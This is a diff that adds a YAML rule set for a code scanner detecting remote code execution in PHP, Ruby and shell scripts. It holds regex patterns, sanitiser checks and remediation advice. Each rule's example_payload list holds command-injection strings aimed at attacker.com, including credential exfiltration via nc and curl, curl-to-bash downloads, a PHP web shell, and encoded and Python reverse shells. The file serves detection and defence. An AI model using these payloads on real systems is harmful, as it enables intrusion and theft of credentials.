@@ -1,0 +1,581 @@
+rules:
+- rule_id: RCE-PHP-001
+  title: Remote Code Execution via PHP System Functions
+  description: 'Detects PHP functions that execute system commands or PHP code with user-controlled input. Covers system(),
+    exec(), passthru(), shell_exec(), popen(), proc_open(), eval(), assert(), backtick operator, and preg_replace with /e
+    modifier across WordPress, Laravel, Symfony, and vanilla PHP applications.
+
+    '
+  language: php
+  category: rce
+  severity: Critical
+  confidence: 0.96
+  cwe: CWE-78
+  owasp: A03:2021-Injection
+  tags:
+  - rce
+  - system-exec
+  - eval
+  - php
+  - injection
+  - wordpress
+  - laravel
+  patterns:
+  - type: regex
+    pattern: (?:system|exec|passthru|shell_exec|popen|proc_open)\s*\(\s*\$(?:_GET|_POST|_REQUEST|_COOKIE)\[
+    description: Command execution function with superglobal input
+  - type: regex
+    pattern: \beval\s*\(\s*\$(?:_GET|_POST|_REQUEST|_COOKIE)\[
+    description: eval with superglobal input
+  - type: regex
+    pattern: (?:assert|create_function|call_user_func|call_user_func_array)\s*\(\s*\$(?:_GET|_POST|_REQUEST)\[
+    description: Code execution via assert/create_function/call_user_func with superglobal
+  - type: regex
+    pattern: preg_replace\s*\(\s*['"][^'"]*e[^'"]*["'].*\$(?:_GET|_POST|_REQUEST)
+    description: preg_replace with /e modifier and superglobal input
+  - type: regex
+    pattern: '`\$(?:_GET|_POST|_REQUEST)\['
+    description: Backtick operator with superglobal input
+  - type: regex
+    pattern: (?:system|exec|passthru|shell_exec|popen|proc_open)\s*\(\s*\$(?:input|data|cmd|command|param|user|arg|file|path|url|name|value)\b
+    description: Command execution with suspiciously named variable
+  - type: regex
+    pattern: eval\s*\(\s*(?:base64_decode|gzuncompress|gzinflate|str_rot13)\s*\(
+    description: eval with obfuscated payload (base64/gz/rot13 decode)
+  - type: regex
+    pattern: \$\w+\s*\(\s*\$(?:_GET|_POST|_REQUEST|_COOKIE)\[
+    description: Variable function call with superglobal (dynamic dispatch)
+  - type: regex
+    pattern: array_map\s*\(\s*['"](?:system|exec|passthru|shell_exec)["']\s*,\s*\$(?:_GET|_POST|_REQUEST)
+    description: array_map with command execution callback and superglobal
+  - type: regex
+    pattern: usort\s*\(\s*[^,]+,\s*['"](?:system|exec|assert)["']\s*\)
+    description: usort with command execution callback
+  - type: regex
+    pattern: file_put_contents\s*\([^,]+,\s*[^)]*\$(?:_GET|_POST|_REQUEST)\[[^]]*\]\s*\)[\s\S]{0,200}(?:include|require|eval)
+    description: File write followed by include/eval (write-then-execute pattern)
+  - type: regex
+    pattern: (?:include|require|include_once|require_once)\s*\(\s*\$(?:_GET|_POST|_REQUEST)\[
+    description: File inclusion with superglobal (LFI/RFI to RCE)
+  anti_patterns:
+  - pattern: escapeshellarg\s*\(
+    reason: escapeshellarg properly escapes individual shell arguments
+  - pattern: escapeshellcmd\s*\(
+    reason: escapeshellcmd escapes shell metacharacters in commands
+  - pattern: disable_functions
+    reason: php.ini disable_functions blocks dangerous functions
+  - pattern: htmlspecialchars\s*\(
+    reason: HTML encoding (though not sufficient alone for command injection)
+  - pattern: preg_match\s*\(\s*['"].*\^\[a-zA-Z
+    reason: Regex allowlist validation of input
+  - pattern: in_array\s*\(.*allowed
+    reason: Allowlist check for permitted values
+  - pattern: ctype_alnum\s*\(
+    reason: Alphanumeric validation prevents injection characters
+  - pattern: Symfony\\Component\\Process\\Process
+    reason: Symfony Process component uses safe argument passing
+  - pattern: Laravel.*Artisan::call
+    reason: Laravel Artisan commands use parameterized arguments
+  context_awareness:
+    surrounding_context_patterns:
+    - function\s+\w+\s*\(\s*Request\s+\$request
+    - Route::(get|post|put|delete|any)\s*\(
+    - \$app->(get|post|put|delete)\s*\(
+    - class\s+\w+Controller
+    - public\s+function\s+\w+Action\s*\(
+    - add_action|add_filter|register_rest_route
+    taint_source_indicators:
+    - $_GET
+    - $_POST
+    - $_REQUEST
+    - $_COOKIE
+    - $_SERVER['HTTP_
+    - $_FILES
+    - $request->input
+    - $request->get
+    - $request->query
+    - file_get_contents('php://input')
+    - Input::get
+    - $argv
+    taint_sink_indicators:
+    - system\(
+    - exec\(
+    - passthru\(
+    - shell_exec\(
+    - popen\(
+    - proc_open\(
+    - eval\(
+    - assert\(
+    - create_function\(
+    - call_user_func\(
+    - preg_replace.*e.*modifier
+    - include\(|require\(
+    sanitization_patterns:
+    - escapeshellarg\s*\(
+    - escapeshellcmd\s*\(
+    - preg_match\s*\(\s*['"].*\^\[a-zA-Z
+    - ctype_alnum\s*\(
+    - ctype_alpha\s*\(
+    - filter_var\s*\(.*FILTER_SANITIZE
+    - in_array\s*\(.*\$allowed
+    - htmlspecialchars\s*\(
+    - intval\s*\(|floatval\s*\(
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_presence) * exploitability_score
+    exploitability_score: 0.97
+  exploit_scenario:
+    attack_example: 'An attacker sends a crafted GET or POST parameter to a PHP script that passes it directly to system()
+      or exec(). The attacker achieves command execution to upload a web shell, exfiltrate database credentials from wp-config.php
+      or .env files, or pivot to internal services. PHP web shells are especially dangerous as they provide persistent interactive
+      access.
+
+      '
+    example_payload:
+    - ; cat /var/www/html/wp-config.php | nc attacker.com 4444
+    - '| wget http://attacker.com/shell.php -O /var/www/html/uploads/shell.php'
+    - $(curl http://attacker.com/c2.sh | bash)
+    - ; echo '<?php system($_GET["c"]);?>' > /var/www/html/.thumbs.php
+    - '|| mysqldump -u root dbname | gzip | curl -X PUT -d @- http://attacker.com/dump'
+    attacker_objective: 'Achieve arbitrary command execution on the PHP web server, upload persistent web shells for ongoing
+      access, extract database credentials and application secrets, access source code and configuration files, or compromise
+      the entire web server and hosted sites.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.94
+    context_match: 0.9
+    proximity_to_user_input: 0.97
+    sanitization_absence: 0.95
+  impact: 'Full RCE through PHP command execution or code evaluation. PHP applications
+
+    typically run as www-data with access to the entire web root, configuration
+
+    files, database credentials, and often shared hosting environments. Web shell
+
+    installation provides persistent access even after the original vulnerability
+
+    is patched.
+
+    '
+  remediation: "- Add dangerous functions to disable_functions in php.ini:\n    disable_functions = exec,passthru,shell_exec,system,proc_open,popen,eval,assert\n\
+    - Use escapeshellarg() for individual command arguments:\n    system('ls -la ' . escapeshellarg($userPath));\n- Never\
+    \ use eval() or assert() with user input under any circumstances\n- Remove preg_replace /e modifier; use preg_replace_callback\
+    \ instead\n- Implement strict input validation using ctype_alnum() or regex allowlists:\n    if (!ctype_alnum($input))\
+    \ { die('Invalid input'); }\n- Use Symfony Process component for safe subprocess execution:\n    $process = new Process(['/usr/bin/ls',\
+    \ '-la', $sanitizedPath]);\n    $process->run();\n- Apply open_basedir restrictions to limit filesystem access\n- Run\
+    \ PHP with minimal privileges (dedicated user, not root)\n- Use PHP-FPM with chroot jails for isolation\n- Implement a\
+    \ WAF (Web Application Firewall) to filter malicious input\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/78.html
+  - https://www.php.net/manual/en/function.escapeshellarg.php
+  - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: medium
+    author: security-rules-team
+    created_date: '2024-06-01'
+    false_positive_rate: very-low
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - RCE-JS-001
+    - RCE-PY-001
+    - LFI-PHP-001
+    - UPLOAD-PHP-001
+    - DESER-PHP-001
+    compound_risk_note: 'PHP file inclusion (LFI/RFI), unrestricted file upload, and deserialization vulnerabilities frequently
+      chain with command injection. An LFI to log poisoning or file upload to web shell represents a common escalation path.
+      Cross-reference with UPLOAD-PHP-001 and LFI-PHP-001.
+
+      '
+  detection_layer: 1
+- rule_id: RCE-RUBY-001
+  title: Remote Code Execution via Ruby System Methods
+  description: 'Detects Ruby code execution via system, exec, backticks, Open3, IO.popen, or eval with user-controlled input.
+    Covers Rails controllers, Sinatra routes, Grape API endpoints, and general Ruby application patterns including ERB template
+    injection.
+
+    '
+  language: ruby
+  category: rce
+  severity: Critical
+  confidence: 0.94
+  cwe: CWE-78
+  owasp: A03:2021-Injection
+  tags:
+  - rce
+  - kernel-system
+  - eval
+  - ruby
+  - rails
+  - injection
+  patterns:
+  - type: regex
+    pattern: (?:system|exec|spawn|Kernel\.system)\s*\(\s*"[^"]*#\{[^}]*(?:params|request|input)\b
+    description: system/exec/spawn with string interpolation of tainted input
+  - type: regex
+    pattern: '`[^`]*#\{[^}]*(?:params|request|input)\b[^`]*`'
+    description: Backtick command with interpolated tainted input
+  - type: regex
+    pattern: \b(?:eval|instance_eval|class_eval)\s*\(\s*(?:params|request|input)\b
+    description: eval/instance_eval/class_eval with tainted input
+  - type: regex
+    pattern: '%x\[[^\]]*#\{[^}]*(?:params|request|input)\b'
+    description: '%x[] command with interpolated tainted input'
+  - type: regex
+    pattern: IO\.popen\s*\(\s*(?:"[^"]*#\{|[^,)]*(?:params|request|input))\b
+    description: IO.popen with interpolated or tainted input
+  - type: regex
+    pattern: Open3\.(?:capture2|capture2e|capture3|popen2|popen2e|popen3|pipeline)\s*\([^)]*(?:params|request|input)\b
+    description: Open3 methods with tainted input
+  - type: regex
+    pattern: Kernel\.(?:system|exec|spawn|`)\s*\([^)]*(?:params|request|input)\b
+    description: Kernel command methods with tainted input
+  - type: regex
+    pattern: \.send\s*\(\s*(?:params|request|input)\b
+    description: Dynamic method dispatch via send with tainted input
+  - type: regex
+    pattern: system\s*\(\s*"(?:bash|sh|cmd|powershell)\s+[^"]*#\{
+    description: Explicit shell invocation with interpolated input
+  - type: regex
+    pattern: Process\.spawn\s*\([^)]*(?:params|request|input)\b
+    description: Process.spawn with tainted input
+  - type: regex
+    pattern: ERB\.new\s*\([^)]*(?:params|request|input)\b[^)]*\)\.result
+    description: ERB template evaluation with tainted input (SSTI)
+  anti_patterns:
+  - pattern: Shellwords\.escape
+    reason: Shellwords.escape properly escapes shell arguments
+  - pattern: shellescape
+    reason: String#shellescape method safely escapes for shell
+  - pattern: system\s*\(\s*['"][^'"]+['"]\s*,\s*
+    reason: system() with command and separate arguments avoids shell
+  - pattern: Open3\.capture2\s*\(\s*['"][^'"]+['"]\s*,\s*
+    reason: Open3.capture2 with separate arguments avoids shell
+  - pattern: spawn\s*\(\s*\[
+    reason: spawn with array argument avoids shell interpretation
+  - pattern: allowed_commands\.include\?
+    reason: Allowlist check for permitted commands
+  - pattern: \.match\?\s*\(\s*/\^\[a-zA-Z
+    reason: Regex allowlist validation of input
+  context_awareness:
+    surrounding_context_patterns:
+    - class\s+\w+Controller\s*<\s*ApplicationController
+    - def\s+(?:index|show|create|update|destroy|new|edit)
+    - get\s+['"]/
+    - post\s+['"]/
+    - put\s+['"]/
+    - delete\s+['"]/
+    - 'resources?\s+:'
+    - class\s+\w+\s*<\s*Sinatra::Base
+    - class\s+\w+\s*<\s*Grape::API
+    taint_source_indicators:
+    - 'params[:'
+    - params.permit
+    - request.body
+    - request.headers
+    - request.env
+    - 'cookies[:'
+    - 'session[:'
+    - request.raw_post
+    - request.query_string
+    - ARGV
+    - ENV[
+    taint_sink_indicators:
+    - system\(
+    - exec\(
+    - spawn\(
+    - IO\.popen
+    - Open3\.
+    - '`'
+    - '%x['
+    - eval\(
+    - instance_eval
+    - class_eval
+    - module_eval
+    - send\(
+    - public_send\(
+    sanitization_patterns:
+    - Shellwords\.escape\s*\(
+    - \.shellescape
+    - \.match\?\s*\(\s*/\^\[a-zA-Z
+    - allowed_\w+\.include\?
+    - sanitize\(
+    - ActiveRecord::Base\.connection\.quote
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_presence) * exploitability_score
+    exploitability_score: 0.92
+  exploit_scenario:
+    attack_example: 'An attacker submits a crafted parameter to a Rails controller action that interpolates it into a system()
+      call or backtick expression. The attacker achieves command execution to read Rails secrets, extract database credentials
+      from database.yml, access the Rails console, or dump the production database.
+
+      '
+    example_payload:
+    - ; curl http://attacker.com/shell.sh | bash
+    - $(cat /app/config/database.yml | nc attacker.com 4444)
+    - '|| cat /app/config/credentials.yml.enc | base64 | curl -d @- http://attacker.com/'
+    - ; rails runner 'User.all.to_json' | nc attacker.com 4444
+    - '& bundle exec rake db:dump && curl -F ''f=@/tmp/dump.sql'' http://attacker.com/'
+    attacker_objective: 'Achieve arbitrary command execution on the Ruby application server, extract Rails master key and
+      encrypted credentials, access database.yml for connection strings, dump user data, or compromise the deployment pipeline
+      and secrets management.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.9
+    context_match: 0.87
+    proximity_to_user_input: 0.94
+    sanitization_absence: 0.91
+  impact: 'Full RCE in Ruby applications. Rails applications typically have access to
+
+    encrypted credentials, database connections, session secrets, and API keys.
+
+    The attacker can access the Rails console, ActiveRecord models, and the
+
+    entire application codebase including deployment configuration.
+
+    '
+  remediation: "- Use Shellwords.escape() for shell argument escaping:\n    system(\"ls -la #{Shellwords.escape(user_path)}\"\
+    )\n- Pass arguments as arrays to system() to avoid shell interpretation:\n    system(\"ls\", \"-la\", sanitized_path)\n\
+    - Use Open3.capture2 with separate arguments:\n    stdout, status = Open3.capture2(\"/usr/bin/ls\", \"-la\", sanitized_path)\n\
+    - Never use eval/instance_eval/class_eval with user input\n- Implement strict input validation with regex allowlists:\n\
+    \    raise \"Invalid input\" unless input.match?(/\\A[a-zA-Z0-9_.-]+\\z/)\n- Use Ruby standard libraries instead of shell\
+    \ commands (FileUtils, Net::HTTP)\n- Apply the principle of least privilege to the application user\n- Consider using\
+    \ Docker containers with read-only filesystems\n- Regularly audit Gemfile for known-vulnerable dependencies\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/78.html
+  - https://ruby-doc.org/stdlib/libdoc/shellwords/rdoc/Shellwords.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheat_Sheet.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: medium
+    author: security-rules-team
+    created_date: '2024-06-01'
+    false_positive_rate: low
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - RCE-JS-001
+    - RCE-PY-001
+    - DESER-RUBY-001
+    - SSTI-RUBY-001
+    - SQLI-RUBY-001
+    compound_risk_note: 'Ruby deserialization (Marshal.load, YAML.load) and ERB template injection are closely related RCE
+      vectors. Cross-reference with DESER-RUBY-001 and SSTI-RUBY-001. Rails mass assignment may expose paths to inject tainted
+      data.
+
+      '
+  detection_layer: 1
+- rule_id: RCE-SH-001
+  title: Remote Code Execution via Shell Eval/Source
+  description: 'Detects shell scripts that eval or source content from external/untrusted sources, including curl-pipe-bash
+    patterns, unquoted variable expansion in command context, and unsafe heredoc evaluation. Covers bash, sh, zsh, and POSIX
+    shell patterns in scripts, CI/CD pipelines, Docker entrypoints, and infrastructure-as-code.
+
+    '
+  language: shell
+  category: rce
+  severity: Critical
+  confidence: 0.91
+  cwe: CWE-94
+  owasp: A03:2021-Injection
+  tags:
+  - rce
+  - eval
+  - source
+  - curl-pipe
+  - shell
+  - bash
+  - cicd
+  - injection
+  patterns:
+  - type: regex
+    pattern: eval\s+"\$\(
+    description: eval of command substitution output
+  - type: regex
+    pattern: source\s+<\(curl
+    description: source from curl process substitution
+  - type: regex
+    pattern: bash\s+<\(curl
+    description: bash execution of curl process substitution
+  - type: regex
+    pattern: eval\s+"\$\{?\w*(?:INPUT|USER|DATA|PARAM|ARG)\}?"
+    description: eval of environment variable with tainted name
+  - type: regex
+    pattern: \.\s+/dev/stdin\s*<<<
+    description: sourcing from stdin herestring
+  - type: regex
+    pattern: curl\s+[^|]*\|\s*(?:bash|sh|zsh|dash|ksh)
+    description: curl piped directly to shell (curl | bash pattern)
+  - type: regex
+    pattern: wget\s+[^|]*-O\s*-\s*\|\s*(?:bash|sh|zsh)
+    description: wget piped directly to shell (wget -O - | bash)
+  - type: regex
+    pattern: eval\s+"\$\w+"
+    description: eval of variable contents (unvalidated variable expansion)
+  - type: regex
+    pattern: eval\s+\$\w+
+    description: eval of unquoted variable (word splitting + globbing risk)
+  - type: regex
+    pattern: \$\(\s*curl\s+[^)]+\)\s*
+    description: Command substitution of curl output used in command context
+  - type: regex
+    pattern: source\s+/(?:tmp|var/tmp|dev/shm)\b
+    description: Sourcing scripts from world-writable directories
+  - type: regex
+    pattern: \bsh\s+-c\s+"\$\{?\w*(?:INPUT|USER|DATA|PARAM|CMD|COMMAND)\}?"
+    description: sh -c with tainted variable
+  - type: regex
+    pattern: envsubst\s*<[^|]*\|\s*(?:bash|sh|eval)
+    description: envsubst output piped to shell (template injection)
+  - type: regex
+    pattern: xargs\s+(?:-I\s*\S+\s+)?(?:bash|sh)\s+-c
+    description: xargs piping to shell execution
+  anti_patterns:
+  - pattern: '#\s*trusted'
+    reason: Explicit trust annotation by developer
+  - pattern: gpg\s+--verify
+    reason: GPG signature verification before execution
+  - pattern: sha256sum|sha512sum|shasum
+    reason: Cryptographic hash verification of downloaded content
+  - pattern: set\s+-euo\s+pipefail
+    reason: Strict shell mode indicating defensive scripting
+  - pattern: curl.*--fail.*--silent
+    reason: curl with fail-fast flags (does not prevent injection but indicates awareness)
+  - pattern: cosign\s+verify
+    reason: Sigstore cosign verification of artifacts
+  - pattern: \bif\s+\[\s+"\$\w+"\s*=\s*"[^"]*"\s*\]
+    reason: Exact-match comparison before use (allowlist check)
+  - pattern: readonly\s+\w+
+    reason: readonly variables cannot be overwritten by injection
+  - pattern: declare\s+-r\s+\w+
+    reason: Declared readonly variables provide injection resistance
+  context_awareness:
+    surrounding_context_patterns:
+    - '#!/bin/(?:bash|sh|zsh)'
+    - '#!/usr/bin/env\s+(?:bash|sh|zsh)'
+    - FROM\s+.*\nRUN
+    - 'steps:\s*\n\s*-\s+run:'
+    - script:\s*\n\s*-
+    - 'entrypoint:'
+    - ExecStart=
+    - cron|crontab
+    taint_source_indicators:
+    - \$1|\$2|\$3|\$@|\$\*
+    - \$\{?(?:INPUT|USER|DATA|PARAM|ARG|CMD|COMMAND|QUERY|PAYLOAD)\}?
+    - read\s+\w+
+    - \$\(curl
+    - \$\(wget
+    - \$GITHUB_EVENT|\$GITHUB_HEAD_REF|\$GITHUB_REF_NAME
+    - \$CI_COMMIT_MESSAGE|\$CI_MERGE_REQUEST_TITLE
+    - \$QUERY_STRING|\$REQUEST_URI
+    - stdin|/dev/stdin
+    - \$\(cat\s+/proc/|/sys/\)
+    taint_sink_indicators:
+    - eval\s+
+    - 'source\s+|\. '
+    - bash\s+-c
+    - sh\s+-c
+    - xargs\s+.*sh
+    - \bexec\s+
+    - su\s+-c
+    - sudo\s+
+    - ssh\s+.*\$
+    sanitization_patterns:
+    - \[\[\s+"\$\w+"\s*=~\s*\^\[a-zA-Z
+    - case\s+"\$\w+"\s+in
+    - printf\s+'%q'
+    - \$\{\w+//[^}]*\}
+    - sha256sum\s+--check
+    - gpg\s+--verify
+  severity_scoring:
+    severity_weight: 9
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_presence) * exploitability_score
+    exploitability_score: 0.85
+  exploit_scenario:
+    attack_example: 'An attacker compromises an upstream URL that is consumed by a curl-pipe-bash pattern in a CI/CD pipeline
+      or deployment script. Alternatively, an attacker controls a CI variable (e.g., commit message, branch name) that is
+      interpolated into an eval statement. The attacker achieves code execution in the build environment, exfiltrating secrets,
+      modifying build artifacts, or injecting supply chain backdoors.
+
+      '
+    example_payload:
+    - $(curl http://attacker.com/implant.sh | bash)
+    - ; export AWS_SECRET_ACCESS_KEY=$(cat ~/.aws/credentials | base64) && curl http://attacker.com/$AWS_SECRET_ACCESS_KEY
+    - $(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash)
+    - ; cat /run/secrets/* | nc attacker.com 4444
+    - $(python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("attacker.com",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())')
+    attacker_objective: 'Achieve arbitrary code execution in shell environments including CI/CD pipelines, deployment scripts,
+      and container init processes. Primary goals include exfiltrating CI/CD secrets and tokens, injecting backdoors into
+      build artifacts (supply chain attack), compromising deployment credentials, or establishing persistent access to infrastructure.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.85
+    context_match: 0.82
+    proximity_to_user_input: 0.88
+    sanitization_absence: 0.87
+  impact: 'Arbitrary code execution through shell eval or process substitution. Shell
+
+    scripts often run with elevated privileges and have access to deployment
+
+    credentials, cloud tokens, SSH keys, and infrastructure secrets. CI/CD
+
+    pipeline compromise can lead to supply chain attacks affecting all downstream
+
+    consumers of build artifacts.
+
+    '
+  remediation: "- Avoid eval with any external or variable data; restructure logic to use\n  case statements or function dispatch:\n\
+    \    case \"$action\" in\n      start) do_start ;;\n      stop)  do_stop ;;\n      *)     echo \"Unknown action\" >&2;\
+    \ exit 1 ;;\n    esac\n- Download scripts to disk and verify before execution:\n    curl -fsSL https://example.com/script.sh\
+    \ -o /tmp/script.sh\n    echo \"expected_sha256  /tmp/script.sh\" | sha256sum --check --strict\n    bash /tmp/script.sh\n\
+    - Use checksums (SHA-256) or GPG signatures for integrity verification\n- Quote all variable expansions to prevent word\
+    \ splitting and globbing:\n    system \"$sanitized_var\"  # not  system $var\n- Use printf '%q' to safely escape values\
+    \ for shell context:\n    safe_val=$(printf '%q' \"$user_input\")\n- Set strict shell options at the top of every script:\n\
+    \    set -euo pipefail\n- Avoid sourcing scripts from world-writable directories (/tmp, /var/tmp)\n- In CI/CD pipelines,\
+    \ pin action versions by SHA, not tags\n- Use read-only variables for critical values:\n    readonly DEPLOY_TARGET=\"\
+    production\"\n- Prefer parameterized CI/CD steps over inline shell scripts\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/94.html
+  - https://mywiki.wooledge.org/BashPitfalls
+  - https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html
+  - https://www.shellcheck.net/
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: high
+    author: security-rules-team
+    created_date: '2024-06-01'
+    false_positive_rate: medium
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - RCE-JS-001
+    - RCE-PY-001
+    - CICD-SEC-001
+    - SUPPLY-CHAIN-001
+    - SECRETS-EXPOSURE-001
+    compound_risk_note: 'Shell injection in CI/CD pipelines is a high-impact supply chain attack vector. Cross-reference with
+      CICD-SEC-001 for GitHub Actions expression injection, SUPPLY-CHAIN-001 for dependency confusion, and SECRETS-EXPOSURE-001
+      for leaked credentials. Curl-pipe-bash with compromised upstream is a supply chain attack (cf. event-stream, ua-parser-js
+      incidents).
+
+      '
+  detection_layer: 1
